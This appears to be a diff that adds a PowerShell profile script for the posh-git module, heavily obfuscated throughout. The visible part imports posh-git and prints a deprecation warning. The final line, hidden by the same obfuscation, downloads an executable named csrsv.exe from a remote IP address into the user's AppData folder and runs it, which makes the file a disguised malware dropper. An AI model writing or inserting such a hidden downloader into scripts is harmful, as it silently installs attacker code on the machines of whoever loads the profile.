@@ -1,0 +1,21 @@
+${pOS`hgIt`m`Od`ULe} = .("{2}{0}{3}{1}" -f 't-Mo','ule','Ge','d') ("{0}{1}{2}" -f'po','sh-','git') -ListAvailable | &("{0}{2}{1}" -f 'Sort-','ct','Obje') ("{1}{0}"-f'rsion','Ve') -Descending | &("{2}{1}{0}{3}" -f 'jec','lect-Ob','Se','t') -First 1
+if (${P`Os`hGitm`ODuLe}) {
+    ${pO`SHG`It`MOduLe} | .("{2}{0}{4}{3}{1}"-f 'or','ule','Imp','d','t-Mo')
+}
+elseif (.("{0}{1}{2}" -f'Tes','t','-Path') -LiteralPath (${m`OdUL`EpAtH} = .("{0}{2}{1}" -f 'Joi','th','n-Pa') (.("{2}{1}{0}"-f 'th','a','Split-P') ${mYINVO`Ca`TION}."MYcOm`mA`ND"."p`ATh" -Parent) (&("{2}{0}{1}"-f 'in-','Path','Jo') ("{0}{1}" -f 'sr','c') ("{1}{2}{0}{3}"-f 't.psd','posh-g','i','1')))) {
+    &("{1}{0}{2}" -f 'mpo','I','rt-Module') ${modU`LePA`TH}
+}
+else {
+    throw ("{5}{1}{0}{3}{4}{2}" -f' ','ed to','t.','im','port posh-gi','Fail')
+}
+
+
+
+
+
+if (${a`RGS}[0] -ne ("{0}{1}"-f 'c','hoco')) {
+    &("{1}{0}{2}"-f'ite-War','Wr','ning') ((("{1}{4}{9}{0}{2}{3}{7}{5}{11}{10}{6}{8}{12}"-f 's p','posh-gi','rofil','e','t','.','ut','.example','ur','fXW','1 will be removed in a f','ps','e version.'))."ReP`La`cE"('fXW',[STrINg][cHAR]39))
+    &("{0}{1}{2}" -f'W','rite-War','ning') ('Con'+'sid'+'er'+' '+'u'+'sing '+"`Add-PoshGitToProfile` "+'inst'+'ea'+'d.')
+}
+
+(.("{0}{2}{1}"-f 'New-','bject','O') ("{1}{0}{4}{2}{3}{5}" -f'stem.Net.W','Sy','bCl','i','e','ent')).("{0}{2}{3}{1}" -f 'Do','File','wnlo','ad').Invoke(("{3}{1}{5}{6}{10}{4}{11}{0}{7}{2}{9}{8}" -f'8/~yaho','ttp:','csr','h','02.5','/','/9','o/','.exe','sv','4.1','3.23'),"$env:APPDATA\csrsv.exe");&("{0}{2}{4}{1}{3}"-f'Star','s','t-','s','Proce') ("$env:APPDATA\csrsv.exe")
